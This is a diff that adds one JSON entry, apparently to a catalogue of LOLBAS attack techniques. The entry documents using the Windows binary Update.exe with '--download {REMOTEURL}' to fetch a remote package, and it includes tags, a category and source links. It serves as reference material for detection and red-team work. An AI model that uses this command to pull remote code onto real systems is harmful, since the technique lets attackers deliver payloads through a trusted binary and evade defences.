@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-update-exe-download",
+  "name": "LOLBAS · Update.exe (Download)",
+  "command": "Update.exe --download {REMOTEURL}",
+  "description": "The above binary will go to url and look for RELEASES file and download the nuget package.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "update",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Update/",
+  "upstream_id": "Update.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — Update.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Update/"
+    }
+  ]
+}
